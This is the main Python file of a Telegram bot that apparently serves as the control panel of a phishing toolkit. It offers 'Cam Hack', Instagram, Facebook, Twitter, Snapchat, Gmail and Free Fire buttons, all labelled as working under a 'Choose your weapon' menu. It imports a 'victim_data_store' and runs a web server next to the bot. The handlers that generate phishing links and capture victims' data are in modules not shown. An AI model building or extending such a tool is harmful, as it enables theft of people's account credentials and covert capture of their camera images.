import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import time
import threading
from bot.config import BOT_TOKEN
from bot.buttons import (
    handle_cam_hack,
    handle_insta_button, handle_insta_callback,
    handle_face_button, handle_face_callback,
    handle_twit_button, handle_twit_callback,
    handle_snap_button, handle_snap_callback,
    handle_gmail_button, handle_gmail_callback,
    handle_freefire_button, handle_freefire_callback,
    handle_all_links, handle_copy_all
)
from bot.server import app
from bot.utils.storage import link_cache, victim_data_store

bot = telebot.TeleBot(BOT_TOKEN)

# ========== STORE VERIFIED USERS ==========
verified_users = set()  # Users who have verified joining @nrtecno2

# ========== BOTTOM BUTTONS ==========

def get_bottom_buttons():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        KeyboardButton("📸 Cam Hack"),
        KeyboardButton("📸 Instagram"),
        KeyboardButton("📘 Facebook"),
        KeyboardButton("🐦 Twitter"),
        KeyboardButton("👻 Snapchat"),
        KeyboardButton("📧 Gmail"),
        KeyboardButton("🎮 Free Fire"),
        KeyboardButton("🔗 All Links")
    )
    return markup

# ========== JOIN & VERIFY BUTTONS ==========

def get_join_buttons():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("📢 Join @nrtecno2", url="https://t.me/nrtecno2"),
        InlineKeyboardButton("✅ I have joined", callback_data="verify_join")
    )
    return markup

# ========== /START ==========

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id

    # Check if user is already verified
    if user_id in verified_users:
        show_main_menu(message)
        return

    # Not verified → show join & verify buttons
    bot.send_message(
        user_id,
        "🔐 *Access Restricted*\n\n"
        "You must join @nrtecno2 to use this bot.\n\n"
        "👉 [Join @nrtecno2](https://t.me/nrtecno2)\n\n"
        "After joining, click the button below to verify.",
        reply_markup=get_join_buttons(),
        parse_mode="Markdown"
    )

# ========== VERIFY CALLBACK ==========

@bot.callback_query_handler(func=lambda call: call.data == "verify_join")
def verify_join(call):
    user_id = call.from_user.id

    # Add user to verified set
    verified_users.add(user_id)

    bot.answer_callback_query(call.id, "✅ Verified! You can now use the bot.")
    bot.send_message(
        user_id,
        "✅ *Welcome!*\n\nYou can now use all features.",
        reply_markup=get_bottom_buttons(),
        parse_mode="Markdown"
    )

# ========== MAIN MENU ==========

def show_main_menu(message):
    user_id = message.chat.id
    bot.send_message(
        user_id,
        "🔥 *Choose your weapon:*\n\n"
        "📸 Cam Hack (working)\n"
        "📸 Instagram (working)\n"
        "📘 Facebook (working)\n"
        "🐦 Twitter (working)\n"
        "👻 Snapchat (working)\n"
        "📧 Gmail (working)\n"
        "🎮 Free Fire (working)\n"
        "🔗 All Links (working)",
        reply_markup=get_bottom_buttons(),
        parse_mode="Markdown"
    )

# ========== ROUTING ==========

@bot.message_handler(func=lambda message: True)
def route_buttons(message):
    text = message.text
    user_id = message.chat.id

    # Check if user is verified
    if user_id not in verified_users:
        bot.send_message(
            user_id,
            "❌ You must join @nrtecno2 first. Send /start again.",
            reply_markup=get_join_buttons()
        )
        return

    # Route to buttons
    if text == "📸 Cam Hack":
        handle_cam_hack(bot, message, get_bottom_buttons)
    elif text == "📸 Instagram":
        handle_insta_button(bot, message, get_bottom_buttons)
    elif text == "📘 Facebook":
        handle_face_button(bot, message, get_bottom_buttons)
    elif text == "🐦 Twitter":
        handle_twit_button(bot, message, get_bottom_buttons)
    elif text == "👻 Snapchat":
        handle_snap_button(bot, message, get_bottom_buttons)
    elif text == "📧 Gmail":
        handle_gmail_button(bot, message, get_bottom_buttons)
    elif text == "🎮 Free Fire":
        handle_freefire_button(bot, message, get_bottom_buttons)
    elif text == "🔗 All Links":
        handle_all_links(bot, message, get_bottom_buttons)
    else:
        bot.send_message(user_id, "❌ Use buttons below.", reply_markup=get_bottom_buttons())

# ========== INLINE CALLBACKS ==========

@bot.callback_query_handler(func=lambda call: True)
def handle_inline(call):
    data = call.data

    # Instagram callbacks
    if data in ["ig_copy", "ig_back", "ig_menu"]:
        handle_insta_callback(bot, call)
        return

    # Facebook callbacks
    if data in ["face_copy", "face_back", "face_menu"]:
        handle_face_callback(bot, call)
        return

    # Twitter callbacks
    if data in ["twit_copy", "twit_back", "twit_menu"]:
        handle_twit_callback(bot, call)
        return

    # Snapchat callbacks
    if data in ["snap_copy", "snap_back", "snap_menu"]:
        handle_snap_callback(bot, call)
        return

    # Gmail callbacks
    if data in ["gmail_copy", "gmail_back", "gmail_menu"]:
        handle_gmail_callback(bot, call)
        return

    # Free Fire callbacks
    if data in ["free_copy", "free_back", "free_menu"]:
        handle_freefire_callback(bot, call)
        return

    # All Links callbacks
    if data == "copy_all":
        handle_copy_all(bot, call)
        return

    # Generic copy
    if data == "copy":
        bot.answer_callback_query(call.id, "✅ Select and copy the link manually!")
        return

    # Verify join (already handled above, but keep for safety)
    if data == "verify_join":
        verify_join(call)
        return

# ========== RUN BOT ==========

def run_bot():
    while True:
        try:
            bot.infinity_polling(timeout=60)
        except Exception as e:
            print(f"Bot error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    print("🤖 Bot Running... All 8 buttons working!")
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=5000, debug=False)
